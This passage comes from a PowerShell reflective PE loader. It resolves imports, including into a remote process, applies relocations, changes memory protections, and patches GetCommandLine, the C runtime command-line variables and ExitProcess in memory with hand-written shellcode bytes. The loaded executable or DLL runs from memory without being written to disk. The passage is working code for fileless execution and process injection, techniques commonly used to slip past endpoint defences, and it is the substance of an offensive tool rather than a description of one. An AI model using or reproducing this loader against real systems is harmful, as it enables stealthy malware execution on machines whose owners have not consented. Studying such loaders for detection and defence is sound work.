			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])

					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}

			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)

		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)

				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}

				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}

					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}

					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)

		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}

		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}

		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize

			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}

	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,

		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,

		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)

		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @()

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0

		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}

		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8

		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length


		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}

		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################


		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}

				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################


		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr

		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr

		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}

			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)

			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}


	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}

			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)

		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}

		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,

		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}

		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}


